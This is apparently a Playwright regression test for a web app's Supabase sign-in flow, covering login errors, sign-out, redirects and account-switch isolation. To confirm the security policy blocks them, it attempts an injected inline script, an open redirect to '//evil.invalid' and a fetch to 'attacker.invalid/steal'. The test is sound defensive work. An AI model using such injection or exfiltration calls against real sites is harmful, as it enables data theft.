"""Isolated auth regression. Use the same dummy Vite settings as browser_smoke.py.
No real accounts, confirmation emails, or external service requests are created.
Configuration regression: start Vite with VITE_SUPABASE_URL=' https://oppnote-test.invalid '
and VITE_SUPABASE_ANON_KEY=' public-test-key ' to verify pasted whitespace is ignored.
"""
import base64
import json
import os
import re
import time
from pathlib import Path
from urllib.parse import urlparse
from playwright.sync_api import sync_playwright, expect

BASE = 'http://127.0.0.1:5173'
USER = '11111111-1111-4111-8111-111111111111'
def token():
    def enc(value): return base64.urlsafe_b64encode(json.dumps(value).encode()).decode().rstrip('=')
    return enc({'alg':'HS256','typ':'JWT'}) + '.' + enc({'sub':USER,'exp':int(time.time())+3600,'aud':'authenticated','role':'authenticated'}) + '.fake'
user = {'id':USER,'aud':'authenticated','role':'authenticated','email':'test@example.com','app_metadata':{},'user_metadata':{},'created_at':'2026-01-01T00:00:00Z'}
state = {'fail_login':True, 'fail_logout':False}
unexpected, errors = [], []
security_headers = {
    entry['key']: entry['value'].replace('https://hmxobewnxhvlfohujffg.supabase.co', 'https://oppnote-test.invalid')
    for entry in json.loads(Path('vercel.json').read_text())['headers'][0]['headers']
} if os.environ.get('OPPNOTE_TEST_CSP') == '1' else {}

def route(request):
    req=request.request
    url=urlparse(req.url)
    def respond(body,status=200): request.fulfill(status=status,content_type='application/json',body=json.dumps(body),headers={'Access-Control-Allow-Origin':'*','Access-Control-Allow-Headers':'*'})
    if url.netloc=='127.0.0.1:5173':
        if security_headers and req.resource_type == 'document':
            response = request.fetch()
            return request.fulfill(response=response, headers={**response.headers, **security_headers})
        return request.continue_()
    if url.netloc!='oppnote-test.invalid': unexpected.append(req.url); return request.abort()
    if req.method=='OPTIONS': return respond({})
    session={'access_token':token(),'refresh_token':'fake-refresh','expires_in':3600,'token_type':'bearer','user':user}
    if url.path.endswith('/token'):
        if state['fail_login']: return respond({'code':'invalid_credentials','msg':'Invalid login credentials'},400)
        assert req.post_data_json['email']=='test@example.com'
        return respond(session)
    if url.path.endswith('/logout'):
        if state['fail_logout']: return respond({'msg':'Sign out unavailable'},500)
        return respond({})
    if url.path.endswith('/user'): return respond(user)
    if url.path.startswith('/rest/v1/'):
        assert req.method=='GET', 'Auth must not mutate application data'
        return respond([])
    raise AssertionError(req.url)

with sync_playwright() as p:
    browser=p.chromium.launch(headless=True)
    context=browser.new_context(viewport={'width':1440,'height':1000})
    context.route('**/*',route)
    page=context.new_page();page.on('pageerror',lambda err:errors.append(str(err)))
    page.goto(BASE+'/preparation');page.wait_for_load_state('networkidle')
    expect(page).to_have_url(BASE+'/login')
    expect(page.get_by_role('heading',name='Welcome back.')).to_be_visible()
    page.screenshot(path='/tmp/oppnote-auth-desktop.png',full_page=True)
    page.get_by_label('Email',exact=True).fill('test@example.com')
    page.get_by_label('Password',exact=True).fill('example-password')
    expect(page.get_by_label('Password',exact=True)).to_have_attribute('autocomplete','current-password')
    page.get_by_role('button',name='Show password',exact=True).click()
    expect(page.get_by_label('Password',exact=True)).to_have_attribute('type','text')
    page.get_by_role('button',name='Hide password',exact=True).click()
    page.get_by_role('button',name='Sign in',exact=False).click()
    expect(page.get_by_role('alert')).to_contain_text('Invalid login credentials')
    expect(page.get_by_role('button',name='Sign in',exact=False)).to_be_enabled()
    state['fail_login']=False
    page.get_by_role('button',name='Sign in',exact=False).click()
    expect(page).to_have_url(BASE+'/preparation')
    expect(page.get_by_role('heading',name='Your plans')).to_be_visible()
    page.reload();page.wait_for_load_state('networkidle')
    expect(page).to_have_url(BASE+'/preparation')
    state['fail_logout']=True
    page.get_by_role('button',name='Sign out').click()
    expect(page.get_by_role('alert')).to_contain_text('signed out on this device')
    expect(page).to_have_url(BASE+'/login')
    state['fail_logout']=False
    page.get_by_label('Email',exact=True).fill('test@example.com')
    page.get_by_label('Password',exact=True).fill('example-password')
    page.get_by_role('button',name='Sign in',exact=False).click()
    expect(page).to_have_url(BASE+'/preparation')
    page.get_by_role('button',name='Sign out').click()
    expect(page).to_have_url(BASE+'/login')
    page.goto(BASE+'/signup');page.wait_for_load_state('networkidle')
    expect(page).to_have_url(BASE+'/login')
    page.set_viewport_size({'width':390,'height':844})
    assert page.evaluate('document.documentElement.scrollWidth <= innerWidth')
    page.screenshot(path='/tmp/oppnote-auth-mobile.png',full_page=True)
    page.get_by_label('Email',exact=True).fill('test@example.com')
    page.get_by_label('Password',exact=True).fill('example-password')
    page.get_by_role('button',name='Sign in',exact=False).click()
    expect(page).to_have_url(BASE+'/')
    page.goto(BASE+'/login');page.wait_for_load_state('networkidle')
    expect(page).to_have_url(BASE+'/')
    page.goto(BASE+'/auth/callback');page.wait_for_load_state('networkidle')
    expect(page).to_have_url(BASE+'/')
    page.get_by_role('button',name='Sign out').click()
    expect(page).to_have_url(BASE+'/login')
    page.goto(BASE+'/auth/callback?error=access_denied&error_description=untrusted-text')
    expect(page.get_by_role('alert')).to_contain_text('could not be verified')
    expect(page.get_by_text('untrusted-text')).to_have_count(0)
    # A supplied external return URL must never navigate away after signing in.
    page.evaluate("history.replaceState({...history.state,usr:{from:'//evil.invalid/path'}},'')")
    page.reload();page.wait_for_load_state('networkidle')
    page.get_by_label('Email',exact=True).fill('test@example.com')
    page.get_by_label('Password',exact=True).fill('example-password')
    page.get_by_role('button',name='Sign in',exact=False).click()
    expect(page).to_have_url(BASE+'/')
    # Supabase broadcasts account changes across tabs. Private component state
    # must be discarded even when no intermediate signed-out event is emitted.
    page.goto(BASE+'/opportunities/new')
    page.get_by_label('Opportunity title', exact=False).fill('Private account-one draft')
    other_user = {**user, 'id': '22222222-2222-4222-8222-222222222222'}
    page.evaluate("""user => {
        const channel = new BroadcastChannel('sb-oppnote-test-auth-token');
        channel.postMessage({event: 'SIGNED_IN', session: {user, access_token: 'test-account-switch', refresh_token: 'test-refresh'}});
        channel.close();
    }""", other_user)
    expect(page.get_by_label('Opportunity title', exact=False)).to_have_value('')
    if security_headers:
        # Test the built app with the deployed policy: injected scripts and
        # off-site data transfers must fail without breaking sign-in above.
        page.evaluate("""() => {
            const script = document.createElement('script');
            script.textContent = 'window.__injected = true';
            document.body.appendChild(script);
        }""")
        assert not page.evaluate('Boolean(window.__injected)')
        assert page.evaluate("fetch('https://attacker.invalid/steal').then(() => false, () => true)")
    assert not unexpected,unexpected
    assert not errors,errors
    browser.close()
print('PASS: protected redirects, sign-in errors/retry, password visibility, persisted session, sign-out failure/success, closed signup, account-switch isolation, callback errors, external redirect rejection, desktop/mobile. No production traffic.')
